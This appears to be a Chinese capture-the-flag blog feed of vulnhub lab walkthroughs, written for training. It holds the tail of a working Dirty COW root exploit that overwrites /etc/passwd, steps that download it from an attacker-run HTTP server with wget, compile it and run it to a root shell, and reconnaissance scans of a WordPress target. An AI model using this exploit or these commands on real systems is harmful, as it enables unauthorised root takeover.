etcPwdBak.size())&#123;</span><br><span class="line">                                                run = <span class="literal">false</span>; <span class="built_in">break</span>;</span><br><span class="line">                                         &#125;</span><br><span class="line">                                         iter ++; usleep(300000);</span><br><span class="line">                                   &#125;</span><br><span class="line">                                   run = <span class="literal">false</span>;</span><br><span class="line">                                 &#125;);</span><br><span class="line"></span><br><span class="line">  cerr &lt;&lt; <span class="string">&quot;Running ...&quot;</span> &lt;&lt; endl;</span><br><span class="line">  madviseThr-&gt;join();</span><br><span class="line">  writerThr-&gt;join();</span><br><span class="line">  checkerThr-&gt;join();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(iter &lt;= MAXITER)&#123; </span><br><span class="line">       child = forkpty(&amp;master, nullptr, nullptr, nullptr);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(child == -1) exitOnError(<span class="string">&quot;Error forking pty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(child == 0)&#123; </span><br><span class="line">          execlp(<span class="string">&quot;su&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;-&quot;</span>, nullptr);</span><br><span class="line">          exitOnError(<span class="string">&quot;Error on exec.&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(opShell) cerr &lt;&lt; <span class="string">&quot;Password overridden to: &quot;</span> &lt;&lt;  TXTPWD &lt;&lt; endl;</span><br><span class="line">       memset(buffv, 0, BUFFSIZE);</span><br><span class="line">       ssize_t bytes_read = <span class="built_in">read</span>(master, buffv, BUFFSIZE - 1);</span><br><span class="line">       <span class="keyword">if</span>(bytes_read &lt;= 0) exitOnError(<span class="string">&quot;Error reading  su prompt.&quot;</span>);</span><br><span class="line">       cerr &lt;&lt; <span class="string">&quot;Received su prompt (&quot;</span> &lt;&lt; buffv &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl; </span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(write(master, TXTPWD, strlen(TXTPWD)) &lt;= 0) </span><br><span class="line">            exitOnError(<span class="string">&quot;Error writing pwd on tty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(write(master, DISABLEWB, strlen(DISABLEWB)) &lt;= 0) </span><br><span class="line">            exitOnError(<span class="string">&quot;Error writing cmd on tty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(!opShell)&#123;</span><br><span class="line">            <span class="keyword">if</span>(write(master, EXITCMD, strlen(EXITCMD)) &lt;= 0) </span><br><span class="line">                 exitOnError(<span class="string">&quot;Error writing exit cmd on tty.&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(restPwd)&#123;</span><br><span class="line">               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(<span class="string">&quot; &quot;</span>).append(PWDFILE).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span><br><span class="line">                    exitOnError(<span class="string">&quot;Error writing restore cmd on tty.&quot;</span>);</span><br><span class="line">               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span><br><span class="line">                    exitOnError(<span class="string">&quot;Error writing restore cmd (rm) on tty.&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(tcgetattr(STDIN_FILENO, &amp;termOld) == -1 )</span><br><span class="line">                exitOnError(<span class="string">&quot;Error getting terminal attributes.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">           termNew               = termOld;</span><br><span class="line">           termNew.c_lflag       &amp;= static_cast&lt;unsigned long&gt;(~(ICANON | ECHO));</span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(tcsetattr(STDIN_FILENO, TCSANOW, &amp;termNew) == -1)</span><br><span class="line">                exitOnError(<span class="string">&quot;Error setting terminal in non-canonical mode.&quot;</span>);</span><br><span class="line">           rawMode = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">           <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                FD_ZERO(&amp;rfds);</span><br><span class="line">                FD_SET(master, &amp;rfds);</span><br><span class="line">                FD_SET(STDIN_FILENO, &amp;rfds);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(select(master + 1, &amp;rfds, nullptr, nullptr, nullptr) &lt; 0 )</span><br><span class="line">                    exitOnError(<span class="string">&quot;Error on select tty.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(FD_ISSET(master, &amp;rfds)) &#123;</span><br><span class="line">                    memset(buffv, 0, BUFFSIZE);</span><br><span class="line">                    bytes_read = <span class="built_in">read</span>(master, buffv, BUFFSIZE - 1);</span><br><span class="line">                    <span class="keyword">if</span>(bytes_read &lt;= 0) <span class="built_in">break</span>;</span><br><span class="line">                    <span class="keyword">if</span>(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)</span><br><span class="line">                          exitOnError(<span class="string">&quot;Error writing on stdout.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(FD_ISSET(STDIN_FILENO, &amp;rfds)) &#123;</span><br><span class="line">                    memset(buffv, 0, BUFFSIZE);</span><br><span class="line">                    bytes_read = <span class="built_in">read</span>(STDIN_FILENO, buffv, BUFFSIZE - 1);</span><br><span class="line">                    <span class="keyword">if</span>(bytes_read &lt;= 0) exitOnError(<span class="string">&quot;Error reading from stdin.&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(write(master, buffv, bytes_read) != bytes_read) <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">return</span> [](int ret, bool shell)&#123; </span><br><span class="line">       string msg = shell ? <span class="string">&quot;Exit.\n&quot;</span> : string(<span class="string">&quot;Root password is:   &quot;</span>) + TXTPWD + <span class="string">&quot;Enjoy! :-)\n&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span>(ret &lt;= MAXITER)&#123;cerr &lt;&lt; msg; <span class="built_in">return</span> 0;&#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;cerr &lt;&lt; <span class="string">&quot;Exploit failed.\n&quot;</span>; <span class="built_in">return</span> 1;&#125; </span><br><span class="line">  &#125;(iter, opShell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printInfo(char* cmd)&#123;</span><br><span class="line">      cerr &lt;&lt; cmd &lt;&lt; <span class="string">&quot; [-s] [-n] | [-h]\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -s  open directly a shell, if the exploit is successful;&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -n  combined with -s, doesn&#x27;t restore the passwd file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -h  print this synopsis;&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot;\n If no param is specified, the program modifies the passwd file and exits.&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; A copy of the passwd file will be create in the current directory as .ssh_bak&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; (unprivileged user), if no parameter or -n is specified.\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)&#123;</span><br><span class="line">   const char  flags[]   = <span class="string">&quot;shn&quot;</span>;</span><br><span class="line">   int         c;</span><br><span class="line">   bool        opShell   = <span class="literal">false</span>,</span><br><span class="line">               restPwd   = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">   opterr = 0;</span><br><span class="line">   <span class="keyword">while</span> ((c = getopt(argc, argv, flags)) != -1)&#123;</span><br><span class="line">      switch (c)&#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            opShell = <span class="literal">true</span>;</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            restPwd = <span class="literal">false</span>;</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         default:</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;Invalid parameter.&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!restPwd &amp;&amp; !opShell)&#123;</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;Invalid parameter: -n requires -s&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   Dcow dcow(opShell, restPwd);</span><br><span class="line">   <span class="built_in">return</span> dcow.expl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行一个python服务器，它将帮助通过Victim的计算机下载漏洞利用程序。</p>
<p>kali端执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/lampiao<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:23] code 404, message File not found</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:23] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:23] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:24] code 404, message File not found</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:24] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.66.17 - - [08/Apr/2020 01:49:04] <span class="string">&quot;GET /40847.cpp HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>受害者执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@lampiao:/var/www/html$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@lampiao:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">www-data@lampiao:/tmp$ wget http://192.168.66.6:8000/40847.cpp</span><br><span class="line">wget http://192.168.66.6:8000/40847.cpp</span><br><span class="line">--2020-04-08 01:45:33--  http://192.168.66.6:8000/40847.cpp</span><br><span class="line">Connecting to 192.168.66.6:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 10531 (10K) [text/x-c++src]</span><br><span class="line">Saving to: <span class="string">&#x27;40847.cpp&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 10,531      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-04-08 01:45:33 (391 MB/s) - <span class="string">&#x27;40847.cpp&#x27;</span> saved [10531/10531]</span><br><span class="line"></span><br><span class="line">www-data@lampiao:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">40847.cpp</span><br></pre></td></tr></table></figure>

<p>现在已将此文件下载到服务器的/tmp（通用可写）目录中。由于该漏洞利用程序采用.cpp格式进行编译和执行，因此该漏洞利用程序代码中提供了特定的命令。这提供了有关如何编译和执行漏洞40847.ccp的提示。</p>
<p>现在有了root权限的shell！现在读取该flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">40847.cpp</span><br><span class="line">www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">&lt;-Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil            </span><br><span class="line">www-data@lampiao:/tmp$ ./dcow -s</span><br><span class="line">./dcow -s</span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">cp /tmp/.ssh_bak /etc/passwd</span><br><span class="line">rm /tmp/.ssh_bak</span><br><span class="line">root@lampiao:~<span class="comment"># echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span></span><br><span class="line">root@lampiao:~<span class="comment"># cp /tmp/.ssh_bak /etc/passwd</span></span><br><span class="line">root@lampiao:~<span class="comment"># rm /tmp/.ssh_bak</span></span><br><span class="line">root@lampiao:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@lampiao:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@lampiao:~<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@lampiao:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub241.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>msf drupal_drupalgeddon2漏洞利用</li>
<li>Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法（脏牛提权）</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Mr-Robot-1]</title>
    <url>/2020/01/02/Mr-Robot-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>姓名：Mr-Robot: 1<br>发布日期：2016年6月28日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9tcnJvYm90L21yUm9ib3Qub3Zh">https://download.vulnhub.com/mrrobot/mrRobot.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9tcnJvYm90L21yUm9ib3Qub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/mrrobot/mrRobot.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>根据表演，机器人先生。<br>此VM在不同位置有三个key。 您的目标是找到全部三个。 每个密钥逐渐难以找到。<br>VM不太困难。 没有任何高级开发或逆向工程。 该级别被认为是初学者-中级。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.107</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:8D:B7:92 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.107</span></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 80,443,22 -sV -Pn -T5 -A --script=vuln 192.168.56.107</span></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni(<span class="string">&quot;Email</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: http://192.168.56.107/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni(&quot;</span>Email</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/wp-login.php</span><br><span class="line">|     Form id: loginform</span><br><span class="line">|_    Form action: http://192.168.56.107/wp-login.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin/: Possible admin folder</span></span><br><span class="line"><span class="string">|   /admin/index.html: Possible admin folder</span></span><br><span class="line"><span class="string">|   /wp-login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /robots.txt: Robots file</span></span><br><span class="line"><span class="string">|   /feed/: Wordpress version: 4.3.1</span></span><br><span class="line"><span class="string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span></span><br><span class="line"><span class="string">|   /wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /wp-admin/upgrade.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /readme.html: Interesting, a readme.</span></span><br><span class="line"><span class="string">|   /0/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /image/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/rs;<span class="keyword">if</span>(s.useForcedLinkTracking||s.bcf)&#123;<span class="keyword">if</span>(!s.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://192.168.56.107:443/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: https://192.168.56.107:443/js/rs;if(s.useForcedLinkTracking||s.bcf)&#123;if(!s.&quot;</span></span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: https://192.168.56.107:443/</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin/: Possible admin folder</span></span><br><span class="line"><span class="string">|   /admin/index.html: Possible admin folder</span></span><br><span class="line"><span class="string">|   /wp-login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /robots.txt: Robots file</span></span><br><span class="line"><span class="string">|   /feed/: Wordpress version: 4.3.1</span></span><br><span class="line"><span class="string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span></span><br><span class="line"><span class="string">|   /wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /wp-admin/upgrade.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /readme.html: Interesting, a readme.</span></span><br><span class="line"><span class="string">|   /0/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /image/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>

<p>dirb扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.107/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jan  2 20:43:02 2020</span><br><span class="line">URL_BASE: http://192.168.56.107/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.107/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/0/                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/admin/                                                           </span><br><span class="line">+ http://192.168.56.107/atom (CODE:301|SIZE:0)                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/audio/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/blog/                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/css/                                                             </span><br><span class="line">+ http://192.168.56.107/dashboard (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/favicon.ico (CODE:200|SIZE:0)                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/feed/                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/image/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/Image/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/images/                                                          </span><br><span class="line">+ http://192.168.56.107/index.html (CODE:200|SIZE:1188)                                               </span><br><span class="line">+ http://192.168.56.107/index.php (CODE:301|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/intro (CODE:200|SIZE:516314)                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/js/                                                              </span><br><span class="line">+ http://192.168.56.107/license (CODE:200|SIZE:309)                                                   </span><br><span class="line">+ http://192.168.56.107/login (CODE:302|SIZE:0)                                                       </span><br><span class="line">+ http://192.168.56.107/page1 (CODE:301|SIZE:0)                                                       </span><br><span class="line">+ http://192.168.56.107/phpmyadmin (CODE:403|SIZE:94)                                                 </span><br><span class="line">+ http://192.168.56.107/rdf (CODE:301|SIZE:0)                                                         </span><br><span class="line">+ http://192.168.56.107/readme (CODE:200|SIZE:64)                                                     </span><br><span class="line">+ http://192.168.56.107/robots (CODE:200|SIZE:41)                                                     </span><br><span class="line">+ http://192.168.56.107/robots.txt (CODE:200|SIZE:41)                                                 </span><br><span class="line">+ http://192.168.56.107/rss (CODE:301|SIZE:0)                                                         </span><br><span class="line">+ http://192.168.56.107/rss2 (CODE:301|SIZE:0)                                                        </span><br><span class="line">+ http://192.168.56.107/sitemap (CODE:200|SIZE:0)                                                     </span><br><span class="line">+ http://192.168.56.107/sitemap.xml (CODE:200|SIZE:0)                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/video/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-admin/                                                        </span><br><span class="line">+ http://192.168.56.107/wp-config (CODE:200|SIZE:0)                                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-content/                                                      </span><br><span class="line">+ http://192.168.56.107/wp-cron (CODE:200|SIZE:0)                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-includes/                                                     </span><br><span class="line">+ http://192.168.56.107/wp-links-opml (CODE:200|SIZE:227)                                             </span><br><span class="line">+ http://192.168.56.107/wp-load (CODE:200|SIZE:0)                                                     </span><br><span class="line">+ http://192.168.56.107/wp-login (CODE:200|SIZE:2678)                                                 </span><br><span class="line">+ http://192.168.56.107/wp-mail (CODE:500|SIZE:3064)                                                  </span><br><span class="line">+ http://192.168.56.107/wp-settings (CODE:500|SIZE:0)                                                 </span><br><span class="line">+ http://192.168.56.107/wp-signup (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/xmlrpc (CODE:405|SIZE:42)                                                     </span><br><span class="line">+ http://192.168.56.107/xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure>
<p>可以看到是wordpress的cms</p>
